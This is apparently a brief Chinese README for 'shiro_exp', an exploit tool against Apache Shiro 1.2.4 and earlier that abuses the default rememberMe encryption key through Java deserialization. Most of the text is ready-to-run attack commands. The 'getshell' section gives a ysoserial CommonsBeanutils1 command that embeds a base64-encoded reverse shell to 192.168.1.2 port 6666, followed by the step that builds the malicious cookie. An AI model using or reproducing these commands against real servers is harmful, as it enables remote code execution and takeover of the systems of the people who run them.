# shiro_exp
目前支持java环境：1.8 11<br/>
shiro&lt;=1.2.4默认密钥加密exp，利用yeoserial工具生成反序列化payload，通过shiro_exp生成rememberme字段值，构造数据包实施攻击

# getshell
java -jar ysoserial-all.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}" > poc.ser<br/>
java -jar shiro_exp >./getshell.txt
